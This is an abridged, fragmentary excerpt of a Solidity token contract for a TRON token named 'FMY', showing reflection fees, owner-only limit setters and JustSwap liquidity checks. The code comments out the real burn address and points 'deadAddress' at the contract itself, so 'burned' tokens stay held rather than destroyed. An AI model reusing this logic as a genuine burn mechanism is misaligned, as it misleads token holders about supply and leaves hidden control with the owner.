...
library Address {
    ...
    function isContract(address account) internal view returns (bool) {
        ...
        // and 0xc240d7a854d469ae494e8158c13f0aa160511c2519841778170e3d9d41f2057c is returned
        // for accounts without code, i.e. `keccak256('')`
        bytes32 codehash;


            bytes32 accountHash
         = 0xc240d7a854d469ae494e8158c13f0aa160511c2519841778170e3d9d41f2057c;
...
contract Token is Context, ITRC20, Ownable {
    ...
    // balance record
    mapping(address => uint256) private lpInApprove;
    ...
    //
    uint256 private _tTotal = 12000 * 10**6;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal = 0;
    uint256 private _tBurnTotal = 0;
    /// 
    uint256 public _maxTxAmount = _tTotal.mul(50).div(10**2);

    //
    string private _name = "FMY";
    //
    ...
    //
    uint256 public _maxBurnAmount = _tTotal.mul(20).div(10**2);

    //
    // address public immutable deadAddress =
    //     0x000000000000000000000000000000000000dEaD;
    address public immutable deadAddress = address(this);
    ...
    IJustswapFactory public immutable justswapFactory;

    // mainnet  factory ：TXk8rQSAvPvBBNtqSoY6nCfsXWCSSpTVQF
    // nile  factory : TXFouUxm4Qs3c1VxfQtCo4xMxbpwE3aWDM
    // _fundAddress: 
    constructor(
        address payable justswapFactoryAddress,
        address payable _fundAddress
    ) public {
        _rOwned[_msgSender()] = _rTotal;

        IJustswapFactory _justswapFactory = IJustswapFactory(
            justswapFactoryAddress
        );

        // set the rest of the contract variables
        justswapFactory = _justswapFactory;
    ...
    function justswapExchange() public view returns (address) {
        return justswapFactory.getExchange(address(this));
    }
    ...
    function funAddress() public view returns (address) {
        return fundAddress;
    }
    ...
    function setMaxBurnPercent(uint256 maxBurnPercent) external onlyOwner() {
        _maxBurnAmount = _tTotal.mul(maxBurnPercent).div(10**2);
    }
    ...
    function _approve(
        ...
        address justswapExchangeAddress = justswapExchange();

        if (justswapExchangeAddress != address(0)) {
            lpInApprove[owner] = ITRC20(justswapExchangeAddress).balanceOf(
                owner
            );
        }
    ...
    function _transfer(
        ...
        uint256 trxIntransfer = 0;
        uint256 lpInTransfer = 0;
        uint256 justswpExchangeTokenTotalSuplly = 0;

        address currentAccount = (
            msg.sender == justswapExchangeAddress
                ? (from == justswapExchangeAddress ? to : from)
                : msg.sender
        );

        if (justswapExchangeAddress != address(0)) {
            justswpExchangeTokenTotalSuplly = ITRC20(justswapExchangeAddress)
            .totalSupply();
        }

        uint256 currentBalance = address(currentAccount).balance;
        bool isInIf = false;

        if (
            address(msg.sender) == justswapExchangeAddress &&
            to == justswapExchangeAddress
        ) {
            isInIf = true;
            lpInTransfer = ITRC20(justswapExchangeAddress).balanceOf(
                currentAccount
            );
            if (lpInApprove[currentAccount] == lpInTransfer) {
                takeFee = true;
            }
        }
        ...
        if (_tBurnTotal >= _maxBurnAmount) {
            _taxFee = _taxFee.add(_burnFee);
            _burnFee = 0;
            _previousTaxFee = _taxFee;
            _previousBurnFee = _burnFee;
        }
     ...
     */
    function _burn(address from, uint256 tBurn) internal {
